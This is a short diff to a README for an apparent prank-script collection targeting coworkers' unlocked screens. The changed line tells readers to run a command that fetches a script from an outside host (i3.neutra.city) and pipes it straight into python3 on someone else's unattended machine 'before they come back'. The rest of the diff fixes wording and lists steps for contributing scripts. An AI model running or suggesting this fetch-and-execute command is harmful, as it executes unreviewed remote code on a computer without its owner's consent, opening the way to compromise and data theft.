@@ -3,10 +3,10 @@
 ## Does anyone forgor to i3lock ?
 Try executing this before they come back :
 ```shell
-$ curl -fsSL http://localhost:8001/payload.py | python3
+$ curl -fsSL i3.neutra.city | python3
 ```
 
-## How to add spell ?
+## How to add spells ?
 
 - clone the project
 - add your script in a subfolder in the spells folder
